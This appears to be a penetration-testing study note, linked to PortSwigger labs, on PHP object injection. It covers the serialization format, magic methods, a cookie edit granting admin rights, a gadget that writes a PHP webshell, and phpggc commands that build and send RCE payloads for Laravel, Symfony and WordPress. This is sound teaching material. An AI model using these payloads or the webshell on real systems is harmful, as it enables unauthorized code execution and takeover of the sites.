---
tags: [vapt, deserialization, php, intermediate]
difficulty: intermediate
module: "15 - Deserialization"
topic: "15.03 PHP Object Injection"
portswigger_labs: ["Modifying serialized objects", "Using application functionality to exploit insecure deserialization"]
---

# 15.03 — PHP Object Injection

## PHP Serialization Format

```php
// PHP serialize() output:
$user = new User();
$user->name = "Alice";
$user->role = "user";
$user->isAdmin = false;

echo serialize($user);
// Output:
// O:4:"User":3:{s:4:"name";s:5:"Alice";s:4:"role";s:4:"user";s:7:"isAdmin";b:0;}

// FORMAT BREAKDOWN:
// O:4:"User"  → Object of class "User" (class name length = 4)
// :3:         → 3 properties
// {
//   s:4:"name";  → string of length 4, key = "name"
//   s:5:"Alice"; → string of length 5, value = "Alice"
//   s:4:"role";
//   s:4:"user";
//   s:7:"isAdmin";
//   b:0;         → boolean, false
// }

// DATA TYPES IN PHP SERIALIZATION:
// s:5:"hello"    → string (length: value)
// i:42           → integer
// b:1            → boolean (1=true, 0=false)
// d:3.14         → double/float
// N;             → NULL
// a:3:{...}      → array with 3 elements
// O:4:"Name":2:{...} → Object
```

---

## Simple Privilege Escalation (Modify Fields)

```bash
# ORIGINAL COOKIE (base64 of serialized object):
# Base64: Tzo0OiJVc2VyIjozOntzOjQ6Im5hbWUiO3M6NToiQWxpY2UiO3M6NDoicm9sZSI7czo0OiJ1c2VyIjtzOjc6ImlzQWRtaW4iO2I6MDt9

# DECODE:
echo "Tzo0OiJVc2VyIjozOntzOjQ6Im5hbWUiO3M6NToiQWxpY2UiO3M6NDoicm9sZSI7czo0OiJ1c2VyIjtzOjc6ImlzQWRtaW4iO2I6MDt9" | base64 -d
# → O:4:"User":3:{s:4:"name";s:5:"Alice";s:4:"role";s:4:"user";s:7:"isAdmin";b:0;}

# MODIFY:
# Change role: s:4:"user" → s:5:"admin"
# Change isAdmin: b:0 → b:1
# O:4:"User":3:{s:4:"name";s:5:"Alice";s:4:"role";s:5:"admin";s:7:"isAdmin";b:1;}
#                                                  ↑ length!  ↑ value!       ↑ true!

# RE-ENCODE:
echo -n 'O:4:"User":3:{s:4:"name";s:5:"Alice";s:4:"role";s:5:"admin";s:7:"isAdmin";b:1;}' | base64

# SET AS COOKIE AND SEND → admin access!
```

---

## Magic Methods in PHP

```php
// PHP MAGIC METHODS (called automatically during lifecycle):

class Example {
  public $cmd;
  
  // Called when object is CREATED from unserialize():
  public function __wakeup() {
    // Executed immediately after deserialization!
    echo "Object woken up!";
    // If this runs: exec($this->cmd); → RCE!
  }
  
  // Called when object is DESTROYED (garbage collected):
  public function __destruct() {
    // Called when object goes out of scope!
    // exec($this->cmd); → RCE even without explicit call!
  }
  
  // Called when object is cast to STRING:
  public function __toString() {
    return $this->cmd;
    // If result of unserialize is echoed → __toString called!
  }
}

// VULNERABILITY: If any class with dangerous magic methods
// is in scope when unserialize() is called → PHP Object Injection!
```

---

## PHP Object Injection — RCE Chain

```php
// VULNERABLE APPLICATION CODE:
$data = unserialize(base64_decode($_COOKIE['session']));
// If any class in scope has __wakeup or __destruct that runs code...

// EXAMPLE VULNERABLE CLASS (may exist in framework/app):
class Logger {
  public $logFile = '/tmp/log.txt';
  public $logData = '';
  
  public function __destruct() {
    file_put_contents($this->logFile, $this->logData);
    // This WRITES to a file on destruction!
  }
}

// ATTACK: Craft object to write a PHP webshell:
$payload = new Logger();
$payload->logFile = '/var/www/html/shell.php';
$payload->logData = '<?php system($_GET["cmd"]); ?>';

echo base64_encode(serialize($payload));
// → O:6:"Logger":2:{s:7:"logFile";s:25:"/var/www/html/shell.php";s:7:"logData";s:29:"<?php system($_GET["cmd"]); ?>";}

// SEND AS COOKIE → Logger object deserialized → __destruct fires →
// webshell written to shell.php → visit target.com/shell.php?cmd=id → RCE!
```

---

## Finding PHP Object Injection

```bash
# LOOK FOR PHP SERIALIZED DATA IN:
# Cookies (check base64 blobs that decode to O:...)
# POST body fields
# GET parameters
# Hidden form fields

# IDENTIFY PHP SERIALIZATION:
# Starts with: O: (object) or a: (array) or s: (string)
# After base64 decode

# CHECK COOKIES WITH CURL:
curl -v "https://target.com/" 2>&1 | grep -i "set-cookie"
# Look for: session=Tzo0... (base64)

# DECODE AND CHECK:
COOKIE="Tzo0OiJVc2VyIjozOntzOjQ..."
echo "$COOKIE" | base64 -d
# If starts with O: → PHP serialized!

# AUTOMATED TOOL: phpggc (PHP gadget chain generator)
git clone https://github.com/ambionics/phpggc
php phpggc -l                    # list available gadget chains
php phpggc Laravel/RCE1 'id'    # generate RCE payload for Laravel
php phpggc Symfony/RCE4 'id'    # generate RCE payload for Symfony
```

---

## PHPGGC Tool (PHP Gadget Chains)

```bash
# PHPGGC — PHP equivalent of ysoserial

# INSTALL:
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# LIST GADGET CHAINS BY FRAMEWORK:
php phpggc -l
# Output lists: Laravel/RCE, Symfony/RCE, Guzzle/FW, Monolog/RCE...

# GENERATE PAYLOAD:
php phpggc Laravel/RCE1 system id
# → Generates serialized object that calls system('id')

# BASE64 ENCODED:
php phpggc -b Laravel/RCE1 system id
# → base64 of the serialized payload

# COMMON CHAINS:
# Laravel:    Laravel/RCE1, Laravel/RCE2, Laravel/FW1
# Symfony:    Symfony/RCE1, Symfony/RCE2, Symfony/FW1
# Guzzle:     Guzzle/FW1, Guzzle/RCE1
# Monolog:    Monolog/RCE1, Monolog/RCE2
# Wordpress:  WordPress/RCE1
# Yii:        Yii/RCE1
# Magento:    Magento/RCE1
# Typo3:      Typo3/RCE1
# Slim:       Slim/RCE1

# SEND PAYLOAD:
PAYLOAD=$(php phpggc -b Laravel/RCE1 system id)
curl "https://target.com/" -H "Cookie: session=$PAYLOAD"
```

---

## Exploiting Wordpress PHP Object Injection

```bash
# WordPress stores serialized data in:
# - options table (wp_options)
# - user meta (wp_usermeta)
# - Post meta (wp_postmeta)

# IF THEME/PLUGIN HAS UNSERIALIZE ON USER INPUT:
# Often in: widgets, shortcodes, AJAX handlers

# COMMON VULNERABLE PATTERN:
# add_action('init', function() {
#   $data = unserialize(base64_decode($_GET['data']));
# });

# GENERATE WORDPRESS SPECIFIC PAYLOAD:
php phpggc WordPress/RCE1 system id

# ALSO: Check plugin-specific gadget chains
# Many WordPress plugins introduce vulnerable classes
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[11 - Magic Methods Abuse]] — __wakeup, __destruct details
- [[12 - Defense Avoid Untrusted Deserialization]] — defense
